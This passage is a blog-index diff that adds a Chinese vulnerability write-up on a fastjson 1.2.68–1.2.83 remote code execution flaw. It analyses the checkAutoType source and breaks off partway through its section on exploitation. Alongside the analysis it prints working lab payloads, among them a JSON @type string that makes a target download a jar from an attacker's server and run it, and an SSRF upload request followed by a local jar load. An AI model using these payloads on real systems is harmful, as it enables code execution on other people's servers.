@@ -33,7 +33,7 @@
 </tr>
 <tr>
 <td>仓库</td>
-<td><a href="mailto:&#103;&#105;&#116;&#x40;&#103;&#x69;&#x74;&#104;&#x75;&#98;&#x2e;&#x63;&#111;&#x6d;">&#103;&#105;&#116;&#x40;&#103;&#x69;&#x74;&#104;&#x75;&#98;&#x2e;&#x63;&#111;&#x6d;</a>:qincaidunxueli&#x2F;my-blog.git（<code>main</code>）</td>
+<td><a href="mailto:&#103;&#105;&#116;&#64;&#103;&#x69;&#116;&#104;&#x75;&#98;&#x2e;&#99;&#x6f;&#x6d;">&#103;&#105;&#116;&#64;&#103;&#x69;&#116;&#104;&#x75;&#98;&#x2e;&#99;&#x6f;&#x6d;</a>:qincaidunxueli&#x2F;my-blog.git（<code>main</code>）</td>
 </tr>
 <tr>
 <td>部署</td>
@@ -736,6 +736,516 @@
       </categories>
   </entry>
   <entry>
+    <title>CVE-2026-16723 fastjson 1.2.68~1.2.83</title>
+    <url>/2026/11/12/%E6%8A%80%E6%9C%AF/JAVA%E5%AE%89%E5%85%A8/Fastjson/REPORT-CVE-2026-16723/</url>
+    <content><![CDATA[<h1 id="SSRF-TO-RCE"><a href="#SSRF-TO-RCE" class="headerlink" title="SSRF-TO-RCE"></a>SSRF-TO-RCE</h1><h2 id="0-一分钟版本"><a href="#0-一分钟版本" class="headerlink" title="0. 一分钟版本"></a>0. 一分钟版本</h2><p>两个请求。第一个让靶机自己去取文件，第二个让 fastjson 把取回来的文件当类加载。</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">GET /import?url=http://192.168.244.131:19090/payloadf&amp;name=imp</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">POST /parse</span><br><span class="line">&#123;&quot;@type&quot;:&quot;jar:file:.C:.fj.uploads.imp!.Evil&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>靶机桌面弹出计算器，<code>C:\fj\rce-proof-http.txt</code> 里记着执行者的类加载器。</p>
+<p>还有更短的一条——<strong>一个请求</strong>，靶机自己下载、自己加载、自己执行，攻击者全程不碰目标磁盘：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;jar:http:..3232298115:19090.impe!.EvilEx&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>..</code> 是 <code>//</code> 的点号写法。前提是载荷类**继承 <code>Throwable</code>**，原因见 4.2。这条已在 Windows + 8u66 上实测通过，返回 <code>ok:true</code>、proof 文件落地、计算器弹出。</p>
+<p>一句话拆开：</p>
+<p> <strong>SSRF 负责把字节搬到目标磁盘，fastjson 负责把字节变成正在运行的类。</strong><br> 前半段是投递手段，后半段才是漏洞本体。</p>
+<p>这也是整场分享最需要说清的一点——把两件事混在一起讲，就成了夸大。</p>
+<hr>
+<h2 id="1-漏洞档案"><a href="#1-漏洞档案" class="headerlink" title="1. 漏洞档案"></a>1. 漏洞档案</h2><h3 id="1-1-官方原文"><a href="#1-1-官方原文" class="headerlink" title="1.1 官方原文"></a>1.1 官方原文</h3><p><strong>NVD 记录</strong>（CNA：<code>alibaba-cna</code>，状态 Deferred，仅两句）：</p>
+<p> A remote code execution (RCE) vulnerability exists in fastjson 1.2.68<br> through 1.2.83. This vulnerability is exploitable under fastjson’s stock<br> default configuration — no AutoType enablement required, no classpath<br> gadget required.</p>
+<p>译：fastjson 1.2.68 至 1.2.83 存在远程代码执行漏洞。该漏洞在 fastjson <strong>出厂默认配置</strong>下即可利用——<strong>无需开启 AutoType，无需 classpath 上存在 gadget</strong>。</p>
+<p><strong>发现者披露原文</strong>（Kirill Firsov &#x2F; FearsOff）：</p>
+<p> The practical chain: the attacker’s JSON references a remote jar:http:&#x2F;&#x2F;…<br> URL, which fastjson fetches and caches; a follow-up probe using<br> jar:file:&#x2F;proc&#x2F;self&#x2F;fd&#x2F;N reopens that cached archive under a valid class<br> name and initializes the attacker’s class — running code even with<br> autoType off. On JDK 8 the remote class loads directly; on JDK 17&#x2F;21 the<br>  Linux &#x2F;proc&#x2F;self&#x2F;fd file-descriptor trick is used instead.</p>
+<p>译：实际利用链：攻击者的 JSON 引用一个远程 <code>jar:http://...</code> 地址，fastjson 会取回并缓存这份 jar；随后一条探测请求用 <code>jar:file:/proc/self/fd/N</code> 以合法类名重新打开那份缓存归档，并初始化攻击者的类——<strong>即使 autoType 关闭也能执行代码</strong>。JDK 8 上远程类可直接加载；JDK 17&#x2F;21 上则借助 Linux 的 <code>/proc/self/fd</code> 文件描述符。</p>
+<p> 引用时的分寸：NVD 说的是”<strong>默认配置即可利用</strong>“，没提任何 JDK 差异；Firsov 那句 “loads directly” 说的是<strong>类加载层面</strong>——点号形式能过校验、能 <code>defineClass</code>，但完整 <code>JSON.parse</code> 要走完还需要载荷类继承 <code>Throwable</code>（见 4.2）。两句都不冲突，但都不能简化成”一条 JSON 万能”。</p>
+<p><strong>厂商公告</strong>（fastjson2 wiki）：</p>
+<p>Verified end-to-end on Spring Boot 2.x &#x2F; 3.x &#x2F; 4.x and JDK 8 &#x2F; 11 &#x2F; 17 &#x2F; 21.</p>
+<p> 中文公告：唯一部署前置条件是 fat-jar。</p>
+<p>译：已在 Spring Boot 2.x &#x2F; 3.x &#x2F; 4.x 与 JDK 8 &#x2F; 11 &#x2F; 17 &#x2F; 21 上完成端到端验证；唯一与部署相关的前置条件是目标以 fat-jar 形态运行。</p>
+<h3 id="1-2-档案表"><a href="#1-2-档案表" class="headerlink" title="1.2 档案表"></a>1.2 档案表</h3><table>
+<thead>
+<tr>
+<th>项</th>
+<th>值</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>组件</td>
+<td><code>com.alibaba.fastjson:fastjson</code>（1.x）</td>
+</tr>
+<tr>
+<td>受影响</td>
+<td><strong>1.2.68 ~ 1.2.83</strong>（整段区间，不是单点）</td>
+</tr>
+<tr>
+<td>修复</td>
+<td>1.2.84（<code>checkAutoType</code> 入口增加 4 行字符校验）</td>
+</tr>
+<tr>
+<td>评分</td>
+<td>CVSS 9.0</td>
+</tr>
+<tr>
+<td>触发条件</td>
+<td>目标用 fastjson 解析攻击者可影响的 JSON，且请求体里含 <code>@type</code></td>
+</tr>
+<tr>
+<td>前置条件</td>
+<td>与官方口径一致：部署形态为 <strong>fat-jar</strong>（<code>LaunchedURLClassLoader</code>）。链一：目标可出网至攻击者 HTTP 服务，且载荷类继承 <code>Throwable</code>；链二：存在一个能被 <code>jar:file:</code> 寻址的落地文件（上传 &#x2F; 导入 &#x2F; 临时目录）。<strong>不需要</strong>开启 autoType，<strong>不需要</strong>目标先有 gadget</td>
+</tr>
+<tr>
+<td>结果</td>
+<td>远程代码执行（在目标 JVM 内，以目标进程权限）</td>
+</tr>
+</tbody></table>
+<p>版本区间这点值得强调：1.2.42、1.2.47 那些编号是”上一个补丁没打全”，修完就没了。<strong>1.2.68 引入的是一段设计本身有问题</strong>，整段版本都带着它。</p>
+<h3 id="1-3-与以往版本比，先看这张表"><a href="#1-3-与以往版本比，先看这张表" class="headerlink" title="1.3 与以往版本比，先看这张表"></a>1.3 与以往版本比，先看这张表</h3><table>
+<thead>
+<tr>
+<th>维度</th>
+<th>≤ 1.2.67</th>
+<th>1.2.68 ~ 1.2.83</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>攻击者要解决的</td>
+<td>在目标<strong>已有</strong>的类里挑一个能打的</td>
+<td><strong>自己写一个类</strong></td>
+</tr>
+<tr>
+<td>payload 本体</td>
+<td>一段 JSON，类名只是数据</td>
+<td><strong>一段 class，代码由攻击者提供</strong></td>
+</tr>
+<tr>
+<td>第三方依赖</td>
+<td>CommonsCollections、<code>JdbcRowSetImpl</code>、<code>TemplatesImpl</code>…</td>
+<td><strong>零</strong>，JDK 自带即可</td>
+</tr>
+<tr>
+<td>执行阶段出网</td>
+<td>JNDI 类要回连攻击者的 LDAP&#x2F;RMI</td>
+<td><strong>完全不出网</strong></td>
+</tr>
+<tr>
+<td>CVE 形态</td>
+<td>点版本，一个绕过配一个补丁</td>
+<td><strong>区间</strong>，一个设计缺陷贯穿整段</td>
+</tr>
+</tbody></table>
+<p>一句话：<strong>老漏洞是”选类”，这个漏洞是”写类”。</strong> 所以它的 payload 不挑目标环境——装了什么库、JDK 什么版本，影响的是细节，不是可行性。机制层面的展开在第 3 节。</p>
+<hr>
+<h2 id="2-成因：三行代码"><a href="#2-成因：三行代码" class="headerlink" title="2. 成因：三行代码"></a>2. 成因：三行代码</h2><h3 id="2-1-入口：-type-是纯用户输入，没有过滤"><a href="#2-1-入口：-type-是纯用户输入，没有过滤" class="headerlink" title="2.1 入口：@type 是纯用户输入，没有过滤"></a>2.1 入口：<code>@type</code> 是纯用户输入，没有过滤</h3><p><code>DefaultJSONParser.java:1764</code></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (key == JSON.DEFAULT_TYPE_KEY &amp;&amp; !lexer.isEnabled(Feature.DisableSpecialKeyDetect)) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">typeName</span> <span class="operator">=</span> lexer.scanSymbol(symbolTable, <span class="string">&#x27;&quot;&#x27;</span>);          <span class="comment">// 1765 原样取出</span></span><br><span class="line">    <span class="type">Class</span>&lt;?&gt; <span class="variable">clazz</span> <span class="operator">=</span> config.checkAutoType(typeName, <span class="literal">null</span>, lexer.getFeatures());  <span class="comment">// 1767</span></span><br><span class="line">    ...</span><br><span class="line">    <span class="type">ObjectDeserializer</span> <span class="variable">deserializer</span> <span class="operator">=</span> config.getDeserializer(clazz);   <span class="comment">// 1778 首次主动使用</span></span><br><span class="line">    <span class="keyword">return</span> (Map) deserializer.deserialze(<span class="built_in">this</span>, clazz, fieldName);      <span class="comment">// 1788</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>scanSymbol</code> 拿到的就是一串原始字符，<strong>不校验、不转义、不禁字符</strong>。后面所有问题都建立在这个前提上：它从来没被当成不可信输入。</p>
+<h3 id="2-2-四道闸，一道都没拦住"><a href="#2-2-四道闸，一道都没拦住" class="headerlink" title="2.2 四道闸，一道都没拦住"></a>2.2 四道闸，一道都没拦住</h3><p><code>checkAutoType</code> 进入核心逻辑前有四个检查，看起来相当严密：</p>
+<table>
+<thead>
+<tr>
+<th>闸</th>
+<th>位置</th>
+<th>做法</th>
+<th>为什么拦不住 <code>jar:file:...</code></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1 SafeMode</td>
+<td>1312–1330</td>
+<td>开关，开了全禁</td>
+<td>默认关闭</td>
+</tr>
+<tr>
+<td>2 长度</td>
+<td>1338</td>
+<td><code>3 ≤ len &lt; 192</code></td>
+<td>名字长度合规</td>
+</tr>
+<tr>
+<td>3 首末字符哈希</td>
+<td>1364–1372</td>
+<td>拦 <code>[</code> 开头的数组类型名</td>
+<td>只看首末字符</td>
+</tr>
+<tr>
+<td>4 黑名单哈希</td>
+<td>1386–1477</td>
+<td>比对<strong>已知恶意类名的哈希</strong></td>
+<td>我们的”类名”是一段 URL，不在任何黑名单里</td>
+</tr>
+</tbody></table>
+<p>第 4 道最能说明问题：<strong>黑名单枚举的是”类的集合”，攻击者给的是一个”路径字符串”，两者不在同一个维度上。</strong> 这也解释了为什么这个漏洞不能靠”再加几个类名”修掉。</p>
+<h3 id="2-3-核心缺陷：判断”是否可信”的动作，本身执行了一次加载"><a href="#2-3-核心缺陷：判断”是否可信”的动作，本身执行了一次加载" class="headerlink" title="2.3 核心缺陷：判断”是否可信”的动作，本身执行了一次加载"></a>2.3 核心缺陷：判断”是否可信”的动作，本身执行了一次加载</h3><p><code>ParserConfig.java:1479-1498</code>，全文最关键的 20 行：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">boolean</span> <span class="variable">jsonType</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"><span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">resource</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>) + <span class="string">&quot;.class&quot;</span>;        <span class="comment">// 1482 类名 → 资源路径</span></span><br><span class="line">    <span class="keyword">if</span> (defaultClassLoader != <span class="literal">null</span>) &#123;</span><br><span class="line">        is = defaultClassLoader.getResourceAsStream(resource);      <span class="comment">// 1484 资源查找 = 打开 URL</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        is = ParserConfig.class.getClassLoader().getResourceAsStream(resource);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (is != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">ClassReader</span> <span class="variable">classReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReader</span>(is, <span class="literal">true</span>);        <span class="comment">// 1489 把读到的字节当 class 解析</span></span><br><span class="line">        <span class="type">TypeCollector</span> <span class="variable">visitor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TypeCollector</span>(<span class="string">&quot;&lt;clinit&gt;&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]);</span><br><span class="line">        classReader.accept(visitor);                                <span class="comment">// 1492 ASM 扫注解</span></span><br><span class="line">        jsonType = visitor.hasJsonType();                           <span class="comment">// 1493 结论写入</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    <span class="comment">// 1494 静默吞掉</span></span><br><span class="line">&#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">    IOUtils.close(is);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>三处失误叠在这 20 行里：</p>
+<table>
+<thead>
+<tr>
+<th>行</th>
+<th>失误</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1482</td>
+<td>把”类名”当”资源路径”拼接，没有字符白名单</td>
+</tr>
+<tr>
+<td>1484</td>
+<td>用 <code>getResourceAsStream</code>（资源查找）代替”类名解析”，于是 <strong>URL 语义生效</strong></td>
+</tr>
+<tr>
+<td>1493</td>
+<td>信任判定取的是<strong>被检查对象自己声明</strong>的注解</td>
+</tr>
+</tbody></table>
+<p><code>typeName.replace(&#39;.&#39;, &#39;/&#39;)</code> 是整个漏洞的开关：它把点号还原成斜杠，<code>jar:file:.C:.fj...</code> 就变成合法的 <code>jar:file:/C:/fj/...</code>。协议头那个 <code>:</code> 一直保留着，而 <code>getResourceAsStream</code> 遇到形如 URL 的名字会走 URL 处理——这一步既是 <strong>SSRF &#x2F; 任意文件读</strong>的来源，也是后面 <code>defineClass</code> 的字节来源。</p>
+<p>第 1494 行还附赠一个特性：<strong>探测阶段零日志</strong>。目标已经替你打开了任意地址，日志里什么都没有。</p>
+<h3 id="2-4-自证可信：判定逻辑只有一行有效代码"><a href="#2-4-自证可信：判定逻辑只有一行有效代码" class="headerlink" title="2.4 自证可信：判定逻辑只有一行有效代码"></a>2.4 自证可信：判定逻辑只有一行有效代码</h3><p><code>asm/TypeCollector.java</code></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">JSONType</span> <span class="operator">=</span> ASMUtils.desc(com.alibaba.fastjson.annotation.JSONType.class);</span><br><span class="line"><span class="comment">// 展开就是 &quot;Lcom/alibaba/fastjson/annotation/JSONType;&quot;    ← :10</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="type">boolean</span> jsonType;                                  <span class="comment">// :31</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">void</span> <span class="title function_">visitAnnotation</span><span class="params">(String desc)</span> &#123;                   <span class="comment">// :71</span></span><br><span class="line">    <span class="keyword">if</span> (JSONType.equals(desc)) &#123;</span><br><span class="line">        jsonType = <span class="literal">true</span>;                                     <span class="comment">// 只比字符串</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">hasJsonType</span><span class="params">()</span> &#123; <span class="keyword">return</span> jsonType; &#125;            <span class="comment">// :106</span></span><br></pre></td></tr></table></figure>
+
+<p>判定规则只有一条：**注解表里出现那 42 个字符，就算”可信”**。不看来历、不看加载器、不看这个类是谁写的、也不看注解实现是什么。</p>
+<h3 id="2-5-放行：jsonType-为真，直接-return"><a href="#2-5-放行：jsonType-为真，直接-return" class="headerlink" title="2.5 放行：jsonType 为真，直接 return"></a>2.5 放行：<code>jsonType</code> 为真，直接 return</h3><p><code>ParserConfig.java:1500-1518</code></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (autoTypeSupport || jsonType || expectClassFlag) &#123;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">cacheClass</span> <span class="operator">=</span> autoTypeSupport || jsonType;                       <span class="comment">// 1501</span></span><br><span class="line">    clazz = TypeUtils.loadClass(typeName, defaultClassLoader, cacheClass);  <span class="comment">// 1502 原样传下去</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (clazz != <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (jsonType) &#123;</span><br><span class="line">        <span class="keyword">if</span> (autoTypeSupport) TypeUtils.addMapping(typeName, clazz);</span><br><span class="line">        <span class="keyword">return</span> clazz;                                                       <span class="comment">// 1510 直接返回</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1513-1517：ClassLoader / DataSource / RowSet 的危险类加固</span></span><br><span class="line">    <span class="keyword">if</span> (ClassLoader.class.isAssignableFrom(clazz)</span><br><span class="line">            || javax.sql.DataSource.class.isAssignableFrom(clazz)</span><br><span class="line">            || javax.sql.RowSet.class.isAssignableFrom(clazz)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">JSONException</span>(<span class="string">&quot;autoType is not support. &quot;</span> + typeName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>注意 1510 行：<code>jsonType</code> 为真时<strong>直接返回</strong>，下面 1513 行那段加固永远执行不到。这不是”绕过”，是走了另一条分支——设计上它认为”带 <code>@JSONType</code> 的类是作者自己标注的，不必再查”。</p>
+<p>一张自签的通行证，抵掉了三道针对危险类的检查。</p>
+<h3 id="2-6-落地：this-class-是最后一道门"><a href="#2-6-落地：this-class-是最后一道门" class="headerlink" title="2.6 落地：this_class 是最后一道门"></a>2.6 落地：<code>this_class</code> 是最后一道门</h3><p><code>TypeUtils.java:1735-1793</code></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span>&lt;?&gt; <span class="variable">clazz</span> <span class="operator">=</span> mappings.get(className);          <span class="comment">// 1744 类缓存</span></span><br><span class="line"><span class="keyword">if</span> (clazz != <span class="literal">null</span>) <span class="keyword">return</span> clazz;</span><br><span class="line"></span><br><span class="line">clazz = classLoader.loadClass(className);          <span class="comment">// 1761 类名原样交给加载器</span></span><br><span class="line"><span class="keyword">if</span> (cache) mappings.put(className, clazz);         <span class="comment">// 1763 写入缓存</span></span><br></pre></td></tr></table></figure>
+
+<p>最终到 JVM：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">defineClass(<span class="string">&quot;jar:file:/C:/fj/uploads/imp!/Evil&quot;</span>, bytes, <span class="number">0</span>, bytes.length);</span><br></pre></td></tr></table></figure>
+
+<p>JVM 规范强制校验：<strong>请求的名字必须和 class 文件 <code>this_class</code> 自称的名字逐字相同</strong>，否则：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">NoClassDefFoundError: jar:file:/C:/fj/uploads/imp!/Evil (wrong name: Evil)</span><br></pre></td></tr></table></figure>
+
+<p>这就是载荷为什么要改字节里的 <code>this_class</code>：让这个类<strong>自称</strong>叫那串 URL。它从此只有一个合法身份——目标磁盘上那个 jar 的地址。</p>
+<h3 id="2-7-执行："><a href="#2-7-执行：" class="headerlink" title="2.7 执行：&lt;clinit&gt;"></a>2.7 执行：<code>&lt;clinit&gt;</code></h3><p><code>loadClass</code> 成功只是拿到 <code>Class</code> 对象，<code>static</code> 块还没跑。真正执行发生在 1778 行取反序列化器、实例化的那一刻——类的”首次主动使用”，触发初始化，<code>&lt;clinit&gt;</code> 执行。</p>
+<p><strong>这一步是 JVM 的正常行为，不是缺陷。</strong> 缺陷在于：谁有资格让这段字节变成目标进程里的一个类。</p>
+<h3 id="2-8-完整调用链"><a href="#2-8-完整调用链" class="headerlink" title="2.8 完整调用链"></a>2.8 完整调用链</h3><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">@type 字符串（用户可控）</span><br><span class="line">   → replace(&#x27;.&#x27;,&#x27;/&#x27;) + &quot;.class&quot;       变成一次合法 URL        1482</span><br><span class="line">   → getResourceAsStream               目标替你打开文件         1484</span><br><span class="line">   → ASM 扫注解表                       看到自签的 @JSONType      1492</span><br><span class="line">   → jsonType = true                   判定&quot;可信&quot;              1493</span><br><span class="line">   → loadClass(原始字符串)              交给 classloader        1502</span><br><span class="line">   → defineClass(name=原始字符串)       JVM 按 this_class 校验    1761</span><br><span class="line">   → &lt;clinit&gt;                          代码执行                1778</span><br></pre></td></tr></table></figure>
+
+<p><strong>这条链上没有一处”绕过”，也没有一处逻辑错误</strong>——是检查本身就在做加载，而”可信”的凭据由被检查对象自己签发。</p>
+<hr>
+<h2 id="3-为什么”无-gadget”也能-RCE"><a href="#3-为什么”无-gadget”也能-RCE" class="headerlink" title="3. 为什么”无 gadget”也能 RCE"></a>3. 为什么”无 gadget”也能 RCE</h2><p>这是与 1.2.68 之前所有 fastjson 漏洞最本质的区别（精简对比表已前置到 1.3，这里展开机制）：</p>
+<table>
+<thead>
+<tr>
+<th>维度</th>
+<th>≤ 1.2.67</th>
+<th>1.2.68 ~ 1.2.83（本漏洞）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>攻击者要解决的</td>
+<td>找一个 classpath 上已有、能触发危险动作的类</td>
+<td>自己写一个类</td>
+</tr>
+<tr>
+<td>控制的对象</td>
+<td><strong>选哪个类</strong>（类名只是数据）</td>
+<td><strong>类的内容本身</strong></td>
+</tr>
+<tr>
+<td>第三方依赖</td>
+<td>CommonsCollections、<code>JdbcRowSetImpl</code>、<code>TemplatesImpl</code>、mybatis&#x2F;xbean&#x2F;shiro…</td>
+<td><strong>零依赖</strong>，JDK 自带即可</td>
+</tr>
+<tr>
+<td>出网要求</td>
+<td>JNDI 类要能回连攻击者的 LDAP&#x2F;RMI</td>
+<td>执行阶段<strong>完全不出网</strong></td>
+</tr>
+<tr>
+<td>JDK 限制</td>
+<td><code>TemplatesImpl</code> 受版本&#x2F;模块限制，高版本常失效</td>
+<td>只要 class 版本对齐即可</td>
+</tr>
+<tr>
+<td>CVE 形态</td>
+<td>点版本，每个版本一个绕过</td>
+<td><strong>区间</strong>，一个设计缺陷贯穿整段</td>
+</tr>
+</tbody></table>
+<p>旧漏洞的 payload 是”一段 JSON”，能做什么取决于目标装了哪些库——所以老漏洞复现常靠运气。这个漏洞的 payload 是”一段 class”，<strong>代码由攻击者提供</strong>，不挑环境。</p>
+<p>再补一句默认配置的事：不需要 <code>autoTypeSupport=true</code>。<code>jsonType</code> 为真时 1500 行的条件 <code>autoTypeSupport || jsonType</code> 已经成立，默认配置下这条路完全畅通。</p>
+<hr>
+<h2 id="4-一条链的两种走法"><a href="#4-一条链的两种走法" class="headerlink" title="4. 一条链的两种走法"></a>4. 一条链的两种走法</h2><h3 id="4-1-先解决类名：-一律不合法"><a href="#4-1-先解决类名：-一律不合法" class="headerlink" title="4.1 先解决类名：/ 一律不合法"></a>4.1 先解决类名：<code>/</code> 一律不合法</h3><p>直觉上最省事的写法是让靶机直接从我们的 HTTP 服务加载：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;jar:http://3232298115:19090/payloadf!.Evil&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p> IP 必须写成十进制（<code>3232298115</code> 即 <code>192.168.244.131</code>）。<code>checkAutoType</code> 会对整个字符串做 <code>replace(&#39;.&#39;, &#39;/&#39;)</code>，点分 IP 会被拆成 <code>192/168/244/131</code>，URL 直接失效——请求根本发不出去，报错变成 <code>autoType is not support</code>，看上去像”没生效”，其实是地址被改坏了。写 <code>localhost</code> 也可以。</p>
+<p>SSRF 这一步确实成立。靶机的 <code>/debug</code> 端点把过程拆得很清楚（<code>8u66</code> 实测）：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;resource&quot;</span><span class="punctuation">:</span><span class="string">&quot;jar:http://3232298115:19090/payloadf!/Evil.class&quot;</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;stream&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> <span class="attr">&quot;bytes&quot;</span><span class="punctuation">:</span><span class="number">1668</span><span class="punctuation">,</span> <span class="attr">&quot;jsonTypeDirect&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;checkAutoTypeError&quot;</span><span class="punctuation">:</span><span class="string">&quot;... autoType is not support. ...&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>stream:true</code> + <code>bytes:1668</code>：靶机自己发起 GET、把 jar 完整取回来了；<code>jsonTypeDirect:true</code>：ASM 也认出了 <code>@JSONType</code>。<strong>投递和”判可信”两关都过了。</strong></p>
+<p>但它死在第三步：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">java.lang.NoClassDefFoundError: IllegalName: jar:http://3232298115:19090/payloadf!.Evil</span><br><span class="line">    at java.lang.ClassLoader.preDefineClass(Unknown Source)</span><br></pre></td></tr></table></figure>
+
+<p>根因比”空包段”更粗。8u66 的 <code>ClassLoader.checkName</code> 反编译出来只有一句话：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">checkName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (name == <span class="literal">null</span> || name.isEmpty()) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span> (name.indexOf(<span class="string">&#x27;/&#x27;</span>) != -<span class="number">1</span> || name.charAt(<span class="number">0</span>) == <span class="string">&#x27;[&#x27;</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>名字里出现任何一个 <code>/</code>，就是非法类名。</strong> 于是能不能通过第一关，只看 <code>@type</code> 里写的是斜杠还是点号：</p>
+<table>
+<thead>
+<tr>
+<th><code>@type</code> 写法</th>
+<th>结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>jar:file:/C:/fj/uploads/imp!.Evil</code></td>
+<td><code>IllegalName</code></td>
+</tr>
+<tr>
+<td><code>jar:http://3232298115:19090/payloadf!.Evil</code></td>
+<td><code>IllegalName</code>（fetch 已完成，倒在 defineClass）</td>
+</tr>
+<tr>
+<td><code>jar:http:..3232298115:19090.payloadf!.Evil</code></td>
+<td>✅ 通过</td>
+</tr>
+<tr>
+<td><code>jar:file:.C:.fj.uploads.imp!.Evil</code></td>
+<td>✅ 通过</td>
+</tr>
+</tbody></table>
+<p><code>checkName</code> 是纯字符串检查，在 <code>rt.jar</code> 里，与操作系统、与 JDK 大版本都无关。点号化不是为了让 fastjson 好过，<strong>是为了过 JVM 的类名校验</strong>——远程和本地两条路都要求这么写。</p>
+<h3 id="4-2-单阶段能走完，条件是载荷类继承-Throwable"><a href="#4-2-单阶段能走完，条件是载荷类继承-Throwable" class="headerlink" title="4.2 单阶段能走完，条件是载荷类继承 Throwable"></a>4.2 单阶段能走完，条件是载荷类继承 <code>Throwable</code></h3><p>过了类名这一关之后，远程 jar 能不能一条 JSON 打穿，取决于<strong>实例化走哪条路</strong>。同一台 8u66、同一个 HTTP 服务、同样点号形式，只改父类：</p>
+<table>
+<thead>
+<tr>
+<th>载荷类</th>
+<th><code>/parse</code> 结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>public class Evil</code>（无父类）</td>
+<td><code>NoClassDefFoundError: jar:http://2130706433:19092/imp4!/Evil</code><br><code>at FastjsonASMDeserializer_1_Evil.createInstance</code></td>
+</tr>
+<tr>
+<td><code>public class EvilEx extends Exception</code></td>
+<td><code>{&quot;ok&quot;:true,&quot;class&quot;:&quot;jar:http:..2130706433:19092.impe!.EvilEx&quot;,&quot;result&quot;:&quot;...: poc&quot;}</code><br>proof 文件 + 计算器</td>
+</tr>
+</tbody></table>
+<p>差别就在这两行调用栈里：</p>
